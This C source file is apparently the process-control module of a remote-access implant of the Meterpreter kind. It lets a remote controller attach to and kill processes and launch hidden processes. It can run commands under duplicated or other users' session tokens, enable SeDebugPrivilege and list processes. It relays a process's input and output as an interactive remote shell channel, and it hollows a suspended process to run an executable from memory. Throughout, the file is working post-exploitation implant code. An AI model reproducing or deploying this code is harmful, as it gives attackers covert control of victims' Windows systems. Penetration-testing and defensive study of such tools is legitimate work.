#include "precomp.h"
#include "ps.h" // include the code for listing proceses
#include "./../session.h"
#include "in-mem-exe.h" /* include skapetastic in-mem exe exec */

/*
 * Attaches to the supplied process identifier.  If no process identifier is
 * supplied, the handle for the current process is returned to the requestor.
 *
 * req: TLV_TYPE_PID - The process to attach to.
 */
DWORD request_sys_process_attach(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	HANDLE handle = NULL;
	DWORD result = ERROR_SUCCESS;
	DWORD pid;

	// Get the process identifier that we're attaching to, if any.
	pid = packet_get_tlv_value_uint(packet, TLV_TYPE_PID);

	// No pid? Use current.
	if (!pid)
		handle = GetCurrentProcess();
	// Otherwise, attach.
	else
	{
		BOOLEAN inherit = packet_get_tlv_value_bool(packet,
				TLV_TYPE_INHERIT);
		DWORD permission = packet_get_tlv_value_uint(packet, 
				TLV_TYPE_PROCESS_PERMS);

		handle = OpenProcess(permission, inherit, pid);
	}

	// If we have a handle, add it to the response
	if (handle)
		packet_add_tlv_uint(response, TLV_TYPE_HANDLE, (DWORD)handle);
	else
		result = GetLastError();

	// Send the response packet to the requestor
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Closes a handle that was opened via the attach method
 *
 * req: TLV_TYPE_HANDLE - The process handle to close.
 */
DWORD request_sys_process_close(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	HANDLE handle;
	DWORD result = ERROR_SUCCESS;

	handle = (HANDLE)packet_get_tlv_value_uint(packet, TLV_TYPE_HANDLE);

	if (handle)
	{
		if (handle != GetCurrentProcess())
			CloseHandle(handle);
	}
	else
		result = ERROR_INVALID_PARAMETER;

	// Send the response packet to the requestor
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Executes a process using the supplied parameters, optionally creating a
 * channel through which output is filtered.
 *
 * req: TLV_TYPE_PROCESS_PATH      - The executable to launch
 * req: TLV_TYPE_PROCESS_ARGUMENTS - The arguments to pass
 * req: TLV_TYPE_FLAGS             - The flags to execute with
 */
DWORD request_sys_process_execute(Remote *remote, Packet *packet)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	Packet *response = packet_create_response(packet);
	HANDLE in[2], out[2];
	DWORD result = ERROR_SUCCESS;
	PCHAR path, arguments, commandLine = NULL;
	DWORD flags = 0, createFlags = 0;
	BOOL inherit = FALSE;
	Tlv inMemoryData;
	BOOL doInMemory = FALSE;
	HANDLE token, pToken;
	char * cpDesktop = NULL;
	DWORD session = 0;

	dprintf( "[PROCESS] request_sys_process_execute" );

	// Initialize the startup information
	memset(&si, 0, sizeof(si));

	si.cb = sizeof(si);

	// Initialize pipe handles
	in[0]  = in[1]  = NULL;
	out[0] = out[1] = NULL;

	do
	{
		// No response? We suck.
		if (!response)
			break;

		// Get the execution arguments
		arguments = packet_get_tlv_value_string(packet, TLV_TYPE_PROCESS_ARGUMENTS);
		path      = packet_get_tlv_value_string(packet, TLV_TYPE_PROCESS_PATH);
		flags     = packet_get_tlv_value_uint(packet, TLV_TYPE_PROCESS_FLAGS);

		if (packet_get_tlv(packet, TLV_TYPE_VALUE_DATA, &inMemoryData) == ERROR_SUCCESS)
		{	
			doInMemory = TRUE;
			createFlags |= CREATE_SUSPENDED;
		}

		if( flags & PROCESS_EXECUTE_FLAG_DESKTOP )
		{
			do
			{
				cpDesktop = (char *)malloc( 512 );
				if( !cpDesktop )
					break;

				memset( cpDesktop, 0, 512 );

				lock_acquire( remote->lock );

				_snprintf( cpDesktop, 512, "%s\\%s", remote->cpCurrentStationName, remote->cpCurrentDesktopName );

				lock_release( remote->lock );

				si.lpDesktop = cpDesktop;

			} while( 0 );
		}

		// If the remote endpoint provided arguments, combine them with the 
		// executable to produce a command line
		if (path && arguments)
		{
			DWORD commandLineLength = strlen(path) + strlen(arguments) + 2;

			if (!(commandLine = (PCHAR)malloc(commandLineLength)))
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}

			_snprintf(commandLine, commandLineLength, "%s %s", path, arguments);
		}
		else if (path)
			commandLine = path;
		else
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		// If the channelized flag is set, create a pipe for stdin/stdout/stderr
		// such that input can be directed to and from the remote endpoint
		if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED)
		{
			SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
			ProcessChannelContext * ctx = NULL;
			PoolChannelOps chops;
			Channel *newChannel;

			// Allocate the channel context
			if (!(ctx = (ProcessChannelContext *)malloc(sizeof(ProcessChannelContext))))
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}

			memset(&chops, 0, sizeof(chops));

			// Initialize the channel operations
			chops.native.context  = ctx;
			chops.native.write    = process_channel_write;
			chops.native.close    = process_channel_close;
			chops.native.interact = process_channel_interact;
			chops.read            = process_channel_read;

			// Allocate the pool channel
			if (!(newChannel = channel_create_pool(0, CHANNEL_FLAG_SYNCHRONOUS, &chops)))
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}

			// Set the channel's type to process
			channel_set_type(newChannel, "process");

			// Allocate the stdin and stdout pipes
			if ((!CreatePipe(&in[0], &in[1], &sa, 0)) || (!CreatePipe(&out[0], &out[1], &sa, 0)))
			{
				channel_destroy(newChannel, NULL);

				newChannel = NULL;

				free(ctx);

				result = GetLastError();
				break;
			}

			// Initialize the startup info to use the pipe handles
			si.dwFlags   |= STARTF_USESTDHANDLES;
			si.hStdInput  = in[0];
			si.hStdOutput = out[1];
			si.hStdError  = out[1];
			inherit       = TRUE;
			createFlags  |= CREATE_NEW_CONSOLE;

			// Set the context to have the write side of stdin and the read side
			// of stdout
			ctx->pStdin   = in[1];
			ctx->pStdout  = out[0];

			// Add the channel identifier to the response packet
			packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID,channel_get_id(newChannel));
		}

		// If the hidden flag is set, create the process hidden
		if (flags & PROCESS_EXECUTE_FLAG_HIDDEN)
		{
			si.dwFlags     |= STARTF_USESHOWWINDOW;
			si.wShowWindow  = SW_HIDE;
			createFlags    |= CREATE_NO_WINDOW;
		}

		// Should we create the process suspended?
		if (flags & PROCESS_EXECUTE_FLAG_SUSPENDED)
			createFlags |= CREATE_SUSPENDED;

		if (flags & PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN)
		{
			// If there is a thread token use that, otherwise use current process token
			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &token))
				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token);
			
			// Duplicate to make primary token (try delegation first)
			if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &pToken))
			if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &pToken))
			{
				result = GetLastError();
				break;
			}

			// Try to execute the process with duplicated token
			if (!CreateProcessAsUser(pToken, NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, &si, &pi))
			{
				result = GetLastError();
				break;
			}
		}
		else if( flags & PROCESS_EXECUTE_FLAG_SESSION )
		{
			typedef BOOL (WINAPI * WTSQUERYUSERTOKEN)( ULONG SessionId, PHANDLE phToken );
			WTSQUERYUSERTOKEN pWTSQueryUserToken = NULL;
			HANDLE hToken     = NULL;
			HMODULE hWtsapi32 = NULL;
			BOOL bSuccess     = FALSE;
			DWORD dwResult    = ERROR_SUCCESS;

			do
			{
				// Note: wtsapi32!WTSQueryUserToken is not available on NT4 or 2000 so we dynamically resolve it.
				hWtsapi32 = LoadLibraryA( "wtsapi32.dll" );

				session = packet_get_tlv_value_uint( packet, TLV_TYPE_PROCESS_SESSION );

				if( session_id( GetCurrentProcessId() ) == session || !hWtsapi32 )
				{
					if( !CreateProcess( NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, &si, &pi ) )
						BREAK_ON_ERROR( "[PROCESS] execute in self session: CreateProcess failed" );
				}
				else
				{
					pWTSQueryUserToken = (WTSQUERYUSERTOKEN)GetProcAddress( hWtsapi32, "WTSQueryUserToken" );
					if( !pWTSQueryUserToken )
						BREAK_ON_ERROR( "[PROCESS] execute in session: GetProcAdress WTSQueryUserToken failed" );

					if( !pWTSQueryUserToken( session, &hToken ) )
						BREAK_ON_ERROR( "[PROCESS] execute in session: WTSQueryUserToken failed" );
						
					if( !CreateProcessAsUser( hToken, NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, &si, &pi ) )
						BREAK_ON_ERROR( "[PROCESS] execute in session: CreateProcessAsUser failed" );
				}

			} while( 0 );
			
			if( hWtsapi32 )
				FreeLibrary( hWtsapi32 );

			if( hToken )
				CloseHandle( hToken );

			result = dwResult;

			if( result != ERROR_SUCCESS )
				break;
		}
		else
		{
			// Try to execute the process
			if (!CreateProcess(NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, &si, &pi))
			{
				result = GetLastError();
				break;
			}
		}

		//
		// Do up the in memory exe execution if the user requested it
		//
		if (doInMemory) {

			//
			// Unmap the dummy executable and map in the new executable into the
			// target process
			//
			if (!MapNewExecutableRegionInProcess( pi.hProcess, pi.hThread, inMemoryData.buffer))
			{
				result = GetLastError();
				break;
			}

			//
			// Resume the thread and let it rock...
			//
			if (ResumeThread(pi.hThread) == (DWORD)-1)
			{
				result = GetLastError();
				break;
			}

		}

		// Add the process identifier to the response packet
		packet_add_tlv_uint(response, TLV_TYPE_PID, pi.dwProcessId);

		packet_add_tlv_uint(response, TLV_TYPE_PROCESS_HANDLE,(DWORD)pi.hProcess);

		CloseHandle(pi.hThread);

		result = ERROR_SUCCESS;

	} while (0);

	// Close the read side of stdin and the write side of stdout
	if (in[0])
		CloseHandle(in[0]);
	if (out[1])
		CloseHandle(out[1]);

	// Free the command line if necessary
	if (path && arguments && commandLine)
		free(commandLine);

	if( cpDesktop )
		free( cpDesktop );

	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Kills one or more supplied processes
 *
 * req: TLV_TYPE_PID [n]
 */
DWORD request_sys_process_kill(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD result = ERROR_SUCCESS;
	Tlv pidTlv;
	DWORD index = 0;

	while ((packet_enum_tlv(packet, index++, TLV_TYPE_PID,
			&pidTlv) == ERROR_SUCCESS) && 
			(pidTlv.header.length >= sizeof(DWORD)))
	{
		DWORD pid = ntohl(*(LPDWORD)pidTlv.buffer);
		HANDLE h = NULL;

		// Try to attach to the process
		if (!(h = OpenProcess(PROCESS_TERMINATE, FALSE, pid)))
		{
			result = GetLastError();
			break;
		}

		if (!TerminateProcess(h, 0))
			result = GetLastError();

		CloseHandle(h);
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Gets the list of active processes (including their PID, name, user, arch and path)
 * and sends the information back to the requestor. See ps.c for the guts of this.
 */
DWORD request_sys_process_get_processes( Remote * remote, Packet * packet )
{
	Packet * response = NULL;
	HANDLE hToken     = NULL;
	DWORD result      = ERROR_SUCCESS;

	do
	{
		response = packet_create_response( packet );
		if( !response )
			break;

		// If we can, get SeDebugPrivilege...
		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) )
		{
			TOKEN_PRIVILEGES priv = {0};

			priv.PrivilegeCount           = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
				AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );

			CloseHandle( hToken );
		}

		// First we will try to get a process list via the toolhelp API. This method gives us the most information
		// on all processes, including processes we cant actually open and all x64/x86 processes on x64 systems.
		// However NT4 does not have the toolhelp API (but Win98 did!?!).
		result = ps_list_via_toolhelp( response );
		if( result != ERROR_SUCCESS )
		{
			// Second attempt is to use the PSAPI functions which may work on NT4 if the PSAPI patch has been applied.
			result = ps_list_via_psapi( response );
			if( result != ERROR_SUCCESS )
			{
				// Third method is to brute force the process list (and extract info from PEB) if all other methods have failed.
				result = ps_list_via_brute( response );
			}
		}

		packet_transmit_response( result, remote, response );

	} while( 0 );

	return result;
}

/*
 * Handles the getpid request
 */
DWORD request_sys_process_getpid(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);

	packet_add_tlv_uint(response, TLV_TYPE_PID, GetCurrentProcessId());

	packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Returns information about the supplied process handle.
 *
 * req: TLV_TYPE_HANDLE - The handle to gather information from.
 */
DWORD request_sys_process_get_info(Remote *remote, Packet *packet)
{
	BOOL (WINAPI *enumProcessModules)(HANDLE p, HMODULE *mod, DWORD cb, 
			LPDWORD needed);
	DWORD (WINAPI *getModuleBaseName)(HANDLE p, HMODULE mod, LPTSTR base, 
			DWORD baseSize);
	DWORD (WINAPI *getModuleFileNameEx)(HANDLE p, HMODULE mod, LPTSTR path,
			DWORD pathSize);
	Packet *response = packet_create_response(packet);
	HMODULE mod;
	HANDLE psapi = NULL;
	HANDLE handle;
	DWORD result = ERROR_SUCCESS;
	DWORD needed;
	CHAR path[1024], name[256];

	handle = (HANDLE)packet_get_tlv_value_uint(packet, TLV_TYPE_HANDLE);

	do
	{
		// Valid response?
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Valid parameters?
		if (!handle)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		// Open the process API
		if (!(psapi = LoadLibrary("psapi")))
		{
			result = GetLastError();
			break;
		}

		// Try to resolve the necessary symbols
		if ((!((LPVOID)enumProcessModules = 
				(LPVOID)GetProcAddress(psapi, "EnumProcessModules"))) ||
		    (!((LPVOID)getModuleBaseName = 
				(LPVOID)GetProcAddress(psapi, "GetModuleBaseNameA"))) ||
		    (!((LPVOID)getModuleFileNameEx = 
				(LPVOID)GetProcAddress(psapi, "GetModuleFileNameExA"))))
		{
			result = GetLastError();
			break;
		}

		memset(name, 0, sizeof(name));
		memset(path, 0, sizeof(path));

		// Enumerate the first module in the process and get its base name
		if ((!enumProcessModules(handle, &mod, sizeof(mod), &needed) ||
			 (getModuleBaseName(handle, mod, name, sizeof(name) - 1) == 0)))
		{
			result = GetLastError();
			break;
		}

		// Try to get the process' file name
		getModuleFileNameEx(handle, mod, path, sizeof(path) - 1);

		// Set the process' information on the response
		packet_add_tlv_string(response, TLV_TYPE_PROCESS_NAME, name);
		packet_add_tlv_string(response, TLV_TYPE_PROCESS_PATH, path);

	} while (0);

	// Transmit the response
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	// Close the psapi library and clean up
	if (psapi)
		FreeLibrary(psapi);

	return ERROR_SUCCESS;
}

/************************
 * Process DIO handlers *
 ************************/

/*
 * Reads directly from the output handle of the process
 *
 * FIXME: can-block
 */
DWORD process_channel_read(Channel *channel, Packet *request, 
		LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesRead)
{
	ProcessChannelContext *ctx = (ProcessChannelContext *)context;
	DWORD result = ERROR_SUCCESS;

	dprintf( "[PROCESS] process_channel_read. channel=0x%08X, ctx=0x%08X", channel, ctx );

	if (!ReadFile(ctx->pStdout, buffer, bufferSize, bytesRead, NULL))
		result = GetLastError();

	return result;
}

/*
 * Writes data from the remote half of the channel to the process's standard
 * input handle
 */
DWORD process_channel_write(Channel *channel, Packet *request, 
		LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesWritten)
{
	ProcessChannelContext *ctx = (ProcessChannelContext *)context;
	DWORD result = ERROR_SUCCESS;

	dprintf( "[PROCESS] process_channel_write. channel=0x%08X, ctx=0x%08X", channel, ctx );

	if (!WriteFile(ctx->pStdin, buffer, bufferSize, bytesWritten, NULL))
		result = GetLastError();

	return result;
}

/*
 * Closes the channels that were opened to the process.
 */
DWORD process_channel_close(Channel *channel, Packet *request, LPVOID context)
{
	ProcessChannelContext *ctx = (ProcessChannelContext *)context;
	DWORD result = ERROR_SUCCESS;

	dprintf( "[PROCESS] process_channel_close. channel=0x%08X, ctx=0x%08X", channel, ctx );

	if (channel_is_interactive(channel))
		scheduler_remove_waitable(ctx->pStdout);

	// Note: We dont close the handle ctx->pStdout as this will introduce a synchronization
	// problem with the channels interactive thread, specifically the call to WaitForMultipleObjects
	// will have undefined behaviour. The interactive thread will close the handle instead.

	CloseHandle(ctx->pStdin);

	free(ctx);

	return result;
}

/*
 * Callback for when data is available on the standard output handle of
 * a process channel that is interactive mode
 */
DWORD process_channel_interact_notify(Remote *remote, Channel *channel)
{
	ProcessChannelContext *ctx = (ProcessChannelContext *)channel->ops.stream.native.context;
	DWORD bytesRead, bytesAvail = 0;
	CHAR buffer[16384];

	if( PeekNamedPipe( ctx->pStdout, NULL, 0, NULL, &bytesAvail, NULL ) )
	{
		if( bytesAvail )
		{
			if( ReadFile( ctx->pStdout, buffer, sizeof(buffer) - 1, &bytesRead, NULL ) )
			{
				return channel_write( channel, remote, NULL, 0, buffer, bytesRead, NULL );
			}
		}
		else
		{
			// sf: if no data is available on the pipe we sleep to avoid running a tight loop
			// in this thread, as anonymous pipes won't block for data to arrive.
			Sleep( 100 );
		}
	}

	if( GetLastError() != ERROR_SUCCESS )
	{
		process_channel_close( channel, NULL, ctx );
		channel_close( channel, remote, NULL, 0, NULL );
	}

	return ERROR_SUCCESS;
}

/*
 * Enables or disables interactivity with the standard output handle on the channel
 */
DWORD process_channel_interact(Channel *channel, Packet *request, LPVOID context, BOOLEAN interact)
{
	ProcessChannelContext *ctx = (ProcessChannelContext *)context;
	DWORD result = ERROR_SUCCESS;

	dprintf( "[PROCESS] process_channel_interact. channel=0x%08X, ctx=0x%08X, interact=%d", channel, ctx, interact );

	// If the remote side wants to interact with us, schedule the stdout handle
	// as a waitable item
	if (interact)
		result = scheduler_insert_waitable(ctx->pStdout, channel, (WaitableNotifyRoutine)process_channel_interact_notify);
	else // Otherwise, remove it
		result = scheduler_remove_waitable(ctx->pStdout);
	return result;
}

/*
 * Wait on a process handle until it terminates.
 *
 * req: TLV_TYPE_HANDLE - The process handle to wait on.
 */
DWORD request_sys_process_wait(Remote *remote, Packet *packet)
{
	Packet * response = packet_create_response( packet );
	HANDLE handle     = NULL;
	DWORD result      = ERROR_INVALID_PARAMETER;

	handle = (HANDLE)packet_get_tlv_value_uint( packet, TLV_TYPE_HANDLE );
	if( handle )
	{
		if( WaitForSingleObject( handle, INFINITE ) == WAIT_OBJECT_0 )
			result = ERROR_SUCCESS;
	}

	packet_transmit_response( result, remote, response );

	return result;
}
